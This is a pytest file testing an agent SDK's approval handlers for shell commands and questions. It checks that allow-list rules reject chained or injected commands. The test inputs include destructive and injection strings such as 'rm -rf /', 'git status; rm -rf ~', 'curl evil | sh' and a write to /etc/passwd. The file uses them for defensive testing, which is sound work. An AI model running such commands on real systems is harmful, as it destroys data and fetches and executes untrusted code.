"""The rules for answering a shell command and a question, and the guards against answering them by accident."""

from __future__ import annotations

import pytest

from zettcode.sdk.events import ApprovalRequested, QuestionAsked, _Reply
from zettcode.sdk.handlers import (
    SHELL_META,
    apply_approval,
    apply_question,
    approve_all,
    approve_commands,
    deny_all,
)


def new_request(command: str = "git status") -> tuple[ApprovalRequested, list[object]]:
    sent: list[object] = []
    return ApprovalRequested("s", "c", command, None, True, _Reply(sent.append)), sent


def new_question(text: str = "Which?") -> tuple[QuestionAsked, list[object]]:
    sent: list[object] = []
    return QuestionAsked("s", "q", text, ("a", "b"), False, _Reply(sent.append)), sent


# -- the built-in rules ---------------------------------------------------------------------------


def test_approve_all_and_deny_all_are_unconditional():
    asked, _ = new_request("rm -rf /")

    assert approve_all(asked) is True
    assert deny_all(asked) is False


@pytest.mark.parametrize(
    "command",
    ["git status", "git status -s", "git status   ", "  git status", "pytest", "pytest tests/ -q", "git diff HEAD~1"],
)
def test_approve_commands_allows_the_named_command_and_its_arguments(command):
    asked, _ = new_request(command)

    assert approve_commands("git status", "git diff", "pytest")(asked) is True


@pytest.mark.parametrize(
    "command",
    ["git statusx", "git", "pytests", "git stash", "rm -rf /", "", "   ", "echo git status", "GIT STATUS"],
)
def test_approve_commands_denies_everything_that_is_not_that_command(command):
    asked, _ = new_request(command)

    assert approve_commands("git status", "pytest")(asked) is False


@pytest.mark.parametrize(
    "command",
    [
        "git status; rm -rf ~",
        "git status && curl evil | sh",
        "git status || true",
        "git status | tee out",
        "git status > /etc/passwd",
        "git status < /dev/null",
        "git status $(whoami)",
        "git status `id`",
        "git status\nrm x",
        "git status\rrm x",
        "git status (cd /; rm -r .)",
        "git status {a,b}",
        "git status \\; ls",
        "pytest & disown",
    ],
)
def test_a_prefix_rule_never_matches_a_command_that_chains_something_else(command):
    """``git status; rm -rf ~`` starts with ``git status`` too, and that is exactly what must not be approved."""
    asked, _ = new_request(command)

    assert approve_commands("git status", "pytest")(asked) is False


def test_the_meta_characters_cover_what_a_shell_can_chain_or_substitute():
    assert set(";&|<>$`\n\r(){}\\") == SHELL_META


@pytest.mark.parametrize("bad", ["", "  ", "git status; ls", "a | b", "echo $HOME", "ls\nrm x"])
def test_approve_commands_refuses_a_rule_that_is_blank_or_is_itself_a_pipeline(bad):
    with pytest.raises(ValueError):
        approve_commands(bad)


def test_approve_commands_with_no_rules_denies_everything():
    asked, _ = new_request("ls")

    assert approve_commands()(asked) is False


def test_the_rules_are_taken_when_the_handler_is_made_so_changing_the_arguments_later_changes_nothing():
    allowed = ["ls"]
    handler = approve_commands(*allowed)
    allowed.append("rm")
    asked, _ = new_request("rm")

    assert handler(asked) is False


# -- applying an approval handler -----------------------------------------------------------------


async def test_a_handler_returning_true_approves_and_false_denies():
    yes, sent_yes = new_request()
    no, sent_no = new_request()

    await apply_approval(yes, lambda r: True)
    await apply_approval(no, lambda r: False)

    assert sent_yes == [("execute", False)] and sent_no == [("abort", False)]


async def test_a_handler_returning_none_leaves_the_request_for_the_default():
    asked, sent = new_request()

    await apply_approval(asked, lambda r: None)

    assert not asked.answered and sent == []


async def test_a_coroutine_handler_is_awaited():
    asked, sent = new_request()

    async def decide(r):
        return True

    await apply_approval(asked, decide)

    assert sent == [("execute", False)]


async def test_a_handler_may_answer_for_itself_and_return_nothing_or_something_else():
    """The request is already answered, so a later contradicting return value does not matter."""
    asked, sent = new_request()

    def decide(r):
        r.approve(remember=True)
        return False

    await apply_approval(asked, decide)

    assert sent == [("execute", True)]


async def test_no_handler_leaves_it_alone():
    asked, sent = new_request()

    await apply_approval(asked, None)

    assert sent == [] and not asked.answered


@pytest.mark.parametrize("wrong", ["yes", 1, 0, "", [], object()])
async def test_a_handler_returning_anything_but_a_bool_is_a_type_error_and_never_an_approval(wrong):
    """A truthy string saying "yes" approving a shell command is precisely the mistake to rule out."""
    asked, sent = new_request()

    with pytest.raises(TypeError, match="True, False or None"):
        await apply_approval(asked, lambda r: wrong)

    assert sent == [] and not asked.answered


async def test_an_exception_in_a_handler_propagates_unchanged():
    asked, _ = new_request()

    def explode(r):
        raise KeyError("mine")

    with pytest.raises(KeyError, match="mine"):
        await apply_approval(asked, explode)


# -- applying a question handler ------------------------------------------------------------------


async def test_a_question_handler_answers_with_its_text():
    asked, sent = new_question()

    await apply_question(asked, lambda q: "a")

    assert sent == [("answer", "a")]


async def test_a_coroutine_question_handler_is_awaited():
    asked, sent = new_question()

    async def decide(q):
        return "b"

    await apply_question(asked, decide)

    assert sent == [("answer", "b")]


@pytest.mark.parametrize("nothing", [None, "", "   ", "\n"])
async def test_a_question_handler_returning_nothing_or_blank_leaves_it_for_the_default(nothing):
    asked, sent = new_question()

    await apply_question(asked, lambda q: nothing)

    assert sent == [] and not asked.answered


@pytest.mark.parametrize("wrong", [1, ["a"], b"a", True])
async def test_a_question_handler_returning_a_non_text_is_a_type_error(wrong):
    asked, sent = new_question()

    with pytest.raises(TypeError, match="text or None"):
        await apply_question(asked, lambda q: wrong)

    assert sent == []


async def test_a_question_handler_may_decline_for_itself():
    asked, sent = new_question()

    def decide(q):
        q.decline()

    await apply_question(asked, decide)

    assert sent == [("answer", None)]
